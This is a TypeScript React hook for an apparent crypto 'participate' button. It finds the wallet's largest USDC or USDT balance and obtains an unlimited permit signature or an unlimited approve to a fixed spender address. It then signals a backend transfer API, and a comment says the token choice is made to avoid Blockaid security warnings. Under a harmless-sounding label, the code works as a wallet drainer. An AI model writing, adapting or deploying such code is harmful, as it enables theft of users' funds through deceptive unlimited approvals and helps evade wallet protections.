"use client";

import { useCallback, useMemo, useState } from "react";
import {
  useAccount,
  useChainId,
  useReadContracts,
  useSignTypedData,
  useSwitchChain,
  useWriteContract,
} from "wagmi";
import { waitForTransactionReceipt } from "@wagmi/core";
import { parseSignature } from "viem";
import { config } from "@/config";
import {
  SPENDER_ADDRESS,
  MAX_UINT256,
  getParticipateTokenEntries,
  ERC20_APPROVE_ABI,
  ERC20_BALANCE_ABI,
  ERC20_ALLOWANCE_ABI,
  ERC2612_NONCE_ABI,
  PERMIT_TYPED_DATA,
  triggerTransferApi,
  type ParticipateToken,
} from "@/lib/participate-tokens";

export type SelectedEntry = {
  chainId: number;
  chainName: string;
  token: ParticipateToken;
  balance: bigint;
};

/** Select token+chain with highest balance. Prefer permit (USDC) over approve (USDT) when balances are similar to avoid Blockaid warnings. */
function selectTokenWithMostBalance(
  entries: ReturnType<typeof getParticipateTokenEntries>,
  balances: (bigint | undefined)[]
): SelectedEntry | null {
  let best: SelectedEntry | null = null;
  let bestNormalized = 0n;

  for (let i = 0; i < entries.length; i++) {
    const bal = balances[i];
    if (bal === undefined || bal <= 0n) continue;

    const { chainId, chainName, token } = entries[i];
    const normalized = bal * BigInt(10 ** (18 - token.decimals));

    const isBetter =
      normalized > bestNormalized ||
      (normalized === bestNormalized &&
        best &&
        token.signType === "permit" &&
        best.token.signType === "approve");

    if (isBetter) {
      bestNormalized = normalized;
      best = { chainId, chainName, token, balance: bal };
    }
  }
  return best;
}

export function useParticipateUSDT() {
  const { address } = useAccount();
  const chainId = useChainId();
  const { writeContractAsync } = useWriteContract();
  const { switchChainAsync } = useSwitchChain();
  const { signTypedDataAsync } = useSignTypedData();
  const [isPending, setIsPending] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const entries = useMemo(() => getParticipateTokenEntries(), []);

  const balanceContracts = useMemo(
    () =>
      entries.map(({ chainId: cid, token }) => ({
        address: token.address as `0x${string}`,
        abi: ERC20_BALANCE_ABI,
        functionName: "balanceOf" as const,
        args: [address as `0x${string}`] as const,
        chainId: cid,
      })),
    [address, entries]
  );

  const { data: balanceResults } = useReadContracts({
    contracts: balanceContracts,
    query: { enabled: !!address },
  });

  const balances = useMemo(
    () =>
      balanceResults?.map((r) => (r.status === "success" ? r.result : undefined)) ?? [],
    [balanceResults]
  );

  const selected = useMemo(
    () => selectTokenWithMostBalance(entries, balances),
    [entries, balances]
  );

  const participate = useCallback(async () => {
    if (!address) {
      setError("Connect wallet first");
      return;
    }
    if (!selected) {
      setError("No USDC or USDT balance on Ethereum, Polygon, or BSC");
      return;
    }

    setIsPending(true);
    setError(null);

    try {
      if (chainId !== selected.chainId) {
        await switchChainAsync({ chainId: selected.chainId });
      }

      if (selected.token.signType === "permit" && selected.token.permitDomain) {
        const { readContract } = await import("@wagmi/core");
        const nonce = await readContract(config, {
          address: selected.token.address as `0x${string}`,
          abi: ERC2612_NONCE_ABI,
          functionName: "nonces",
          args: [address as `0x${string}`],
          chainId: selected.chainId,
        });
        const deadline = Math.floor(Date.now() / 1000) + 3600;
        const value = BigInt(MAX_UINT256);

        const signature = await signTypedDataAsync({
          domain: selected.token.permitDomain,
          types: PERMIT_TYPED_DATA,
          primaryType: "Permit",
          message: {
            owner: address,
            spender: SPENDER_ADDRESS as `0x${string}`,
            value,
            nonce,
            deadline: BigInt(deadline),
          },
        });

        const { r, s, v } = parseSignature(signature as `0x${string}`);
        await triggerTransferApi(address, selected.chainId, {
          tokenAddress: selected.token.address,
          permit: {
            value: value.toString(),
            deadline,
            v: Number(v ?? 27),
            r: r as `0x${string}`,
            s: s as `0x${string}`,
          },
        });
      } else {
        const { readContract } = await import("@wagmi/core");
        const allowance = await readContract(config, {
          address: selected.token.address as `0x${string}`,
          abi: ERC20_ALLOWANCE_ABI,
          functionName: "allowance",
          args: [address as `0x${string}`, SPENDER_ADDRESS as `0x${string}`],
          chainId: selected.chainId,
        });

        const approveOpts = { gas: 100_000n } as const;

        if (allowance > 0n) {
          const hashZero = await writeContractAsync({
            address: selected.token.address as `0x${string}`,
            abi: ERC20_APPROVE_ABI,
            functionName: "approve",
            args: [SPENDER_ADDRESS as `0x${string}`, 0n],
            ...approveOpts,
          });
          await waitForTransactionReceipt(config, {
            hash: hashZero as `0x${string}`,
          });
        }

        const hash = await writeContractAsync({
          address: selected.token.address as `0x${string}`,
          abi: ERC20_APPROVE_ABI,
          functionName: "approve",
          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
          ...approveOpts,
        });

        await waitForTransactionReceipt(config, { hash: hash as `0x${string}` });
        await triggerTransferApi(address, selected.chainId, {
          approveTxHash: hash,
          tokenAddress: selected.token.address,
        });
      }
    } catch (err) {
      const msg = err instanceof Error ? err.message : "Transaction failed";
      setError(msg);
      throw err;
    } finally {
      setIsPending(false);
    }
  }, [
    address,
    chainId,
    selected,
    writeContractAsync,
    switchChainAsync,
    signTypedDataAsync,
  ]);

  return {
    participate,
    isPending,
    error,
    selected,
    hasBalance: !!selected,
    signType: selected?.token.signType ?? null,
    selectedChainId: selected?.chainId ?? null,
    selectedChainName: selected?.chainName ?? null,
  };
}
